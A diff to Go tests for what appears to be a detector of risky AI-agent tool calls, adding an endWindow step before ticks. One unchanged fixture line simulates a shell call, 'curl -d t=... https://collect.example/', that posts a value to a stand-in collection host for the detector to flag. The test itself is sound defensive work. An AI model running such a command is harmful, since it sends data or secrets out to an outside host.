@@ -190,6 +190,7 @@ func TestMinClassFiltering(t *testing.T) {
 				hook(event.TypeToolPre, "m", shell("x", "curl -d t="+value+" https://collect.example/")),
 				hook(event.TypeSessionEnd, "m"),
 			)
+			h.endWindow()
 			h.tick()
 			got := ruleIDs(h.out.where(func(e *event.Event) bool { return e.Type == event.TypeDetectionFinding }))
 			for _, w := range c.want {
@@ -464,6 +465,7 @@ func TestForeignDetectionsAndInventory(t *testing.T) {
 func TestStreamRestriction(t *testing.T) {
 	h := newHarness(t, func(c *config.Config, o *Options) { c.Output.Streams = []string{"detection", "health"} })
 	h.ingest(hook(event.TypeToolPre, "st", shell("a", "ls")), hook(event.TypeSessionEnd, "st"))
+	h.endWindow()
 	h.tick()
 	if len(h.out.ofType(event.TypeSessionSummary)) != 0 || len(h.local.ofType(event.TypeSessionSummary)) != 1 {
 		t.Error("a stream outside output.streams must stay local")
